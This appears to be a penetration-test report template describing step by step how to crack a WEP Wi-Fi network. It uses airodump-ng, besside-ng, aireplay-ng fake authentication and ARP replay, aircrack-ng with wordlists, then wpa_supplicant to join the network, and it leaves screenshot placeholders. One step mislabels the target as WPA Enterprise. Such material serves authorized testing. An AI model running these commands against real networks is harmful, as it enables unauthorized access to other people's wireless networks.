# Attacking WEP

1. Run an `airodump-ng`  scan: 

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
```

We find our WPA Enterprise network of interest:

**Screenshot of initial airodump screenshot goes here:**
![](image.png)

  

  

  

2. We try a more targeted scan: 

```
sudo airodump-ng wlan0mon --bssid <BSSID>  --channel <CHANNEL> -w <FILE_PREFIX> --output-format pcap
```

**Screenshot of targeted airodump goes here:**

![](image.png)

  

  

  

3. If we see that there is a client connected, use the `besside-ng`  tool to get the password, `aireplay-ng`  to create a fake access point and to do an ARP-request replay attack to generate traffic on the fake access point at the same time. We can open different terminal windows to run the commands simultaneously. 

```bash
# 1. Stop the airodump-ng scan

# 2. stop monitoring on wlan0
sudo airmon-ng stop wlan0

# 3. Kill any processes that may interfere
sudo airmon-ng check kill

# 4. Run besside-ng
sudo besside-ng -c <CHANNEL> -b <BSSID> wlan0

# 5. Take a pcap of the wireless traffic
sudo airodump-ng -c <CHANNEL> --bssid <Wifi AP MAC Address> -w wep wlan0 --output-format pcap

# 6. Create a fake access point
sudo aireplay-ng -1 3600 -q 10 -a <Wifi AP MAC Address> wlan0

# 7. Run an ARP request attack
sudo aireplay-ng --arpreplay -b <Wifi AP MAC Address> -h <MAC Address of Client> wlan0

```

**Screenshot of attack:**

![](image.png)

  

  

  

4. In another terminal window, we can crack the pcap file we captured in the previous step. 

```
sudo aircrack-ng <PCAP FILE> /usr/share/wordlists/rockyou.txt

sudo aircrack-ng <PCAP FILE> /usr/share/john/password.lst

# Convert key to ASCII
sudo aircrack-ng -l ascii-key wep.cap
```

**Screenshot of cracking pcap file:**

⁠![](image.png)

  

  

  

5. After finding the key, we can create a wireless configuration file to connect to the network: 

```
network={
  ssid="<SSID>"
  key_mgmt=NONE
  wep_key0=<PASSWORD>
  wep_tx_keyidx=0
}

```

  

Connect to the wireless network: 

```
sudo wpa_supplicant -D nl80211 -i wlan0 -c wep.conf

```

  

In another terminal, grab another IP address: 

```
sudo dhclient wlan0 -v

```

  

We can then attempt to connect to the default gateway endpoint (This IP should be address `x.x.x.1` ): 

```
firefox x.x.x.1

```

  

**Screenshot of connecting to wireless network:**

![](image.png)
